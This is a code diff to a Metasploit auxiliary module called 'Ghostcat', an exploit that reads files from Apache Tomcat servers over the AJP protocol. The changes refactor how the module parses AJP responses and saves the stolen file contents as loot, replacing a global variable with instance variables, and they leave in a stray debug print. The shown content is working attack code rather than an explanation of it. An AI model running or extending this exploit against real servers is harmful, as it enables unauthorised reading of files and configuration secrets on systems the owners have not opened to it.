@@ -2,6 +2,7 @@ class MetasploitModule < Msf::Auxiliary
     include Msf::Exploit::Remote::Tcp
     include Msf::Auxiliary::Report
 
+
     def initialize(info = {})
         super(update_info(info,
             "Name" => "Ghostcat",
@@ -26,6 +27,9 @@ class MetasploitModule < Msf::Auxiliary
                 OptBool.new('SSL', [ true, 'SSL', false ]),
                 OptPort.new('PORTWEB', [ false, 'Set a port webserver'])
             ])
+
+        @body_data = ""
+        @header_data = ""
     end
 
     def method2code(method)
@@ -176,11 +180,12 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     def read_buf_string(buf, idx)
+        content = ""
         len = buf[idx..(idx+2)].unpack('n')[0]
         idx += 2
-        $content += "#{buf[idx..(idx+len)]}"
+        content += "#{buf[idx..(idx+len)]}"
         idx += len + 1
-        idx
+        return idx, content
     end
 
     def parse_response(buf, idx)
@@ -201,48 +206,50 @@ class MetasploitModule < Msf::Auxiliary
         idx += 2
         if buf[idx] == "\x04"
             idx += 1
-            $content = "Status Code: "
+            print @header_data
+            @header_data += "Status Code: "
             idx += 2
-            idx = read_buf_string(buf, idx)
-            $content += "\n"
+            idx,val = read_buf_string(buf, idx)
+            @header_data += val
+            @header_data += "\n"
             header_num = buf[idx..(idx+2)].unpack('n')[0]
             idx += 2
             for i in 1..header_num
                 if buf[idx] == "\xA0"
                     idx += 1
-                    $content += "#{common_response_headers[buf[idx]]}: "
+                    @header_data += "#{common_response_headers[buf[idx]]}: "
                     idx += 1
-                    idx = read_buf_string(buf, idx)
+                    idx,val = read_buf_string(buf, idx)
+                    @header_data += val
                 else
-                    idx = read_buf_string(buf, idx)
-                    $content += ": "
+                    idx,val = read_buf_string(buf, idx)
+                    @header_data += val
+                    @header_data += ": "
 
-                    idx = read_buf_string(buf, idx)
+                    idx,val = read_buf_string(buf, idx)
+                    @header_data += val
                 end
-                $content += "\n"
+                @header_data += "\n"
 
             end
         elsif buf[idx] == "\x05"
             return 0
         elsif buf[idx] == "\x03"
             idx += 1
-            idx = read_buf_string(buf, idx)
+            idx,val = read_buf_string(buf, idx)
+            @body_data +=val
         else
             return 1
         end
 
         parse_response(buf, idx)
     end
-    def parse_loot(content)
-        status_code = $content.match(/Status Code: [0-9]{3}*/).to_s.split(/ /)[2]
-        content_type = $content.match(/Content-Type: .*/).to_s.split(/ /)[1]
-        content_length = $content.match(/Content-Length: .*/).to_s.split(/ /)[1]
-        content_length = content_length.to_i
-        if content_length > 0 and status_code == "200"
-            data = $content[-content_length..$content.length]
+    def parse_loot(header,content)
+        status_code = header.match(/Status Code: [0-9]{3}*/).to_s.split(/ /)[2]
+        if status_code == "200"
             file = store_loot(
-                datastore['FILENAME'].to_s, content_type, datastore['RHOST'].to_s,
-                data, "Ghostcat File Read/Inclusion", "Read file", datastore['FILENAME']
+                datastore['FILENAME'].to_s, "text/plain", datastore['RHOST'].to_s,
+                content, "Ghostcat File Read/Inclusion", "Read file", datastore['FILENAME']
             )
             print_good file
         else
@@ -261,7 +268,8 @@ class MetasploitModule < Msf::Auxiliary
         data = make_forward_request_package(method, headers, attributes)
         buf = send_recv_once(data)
         parse_response(buf, 0)
-        print $content
-        parse_loot($content)
+        print @header_data
+        print @body_data
+        parse_loot(@header_data,@body_data)
     end
 end
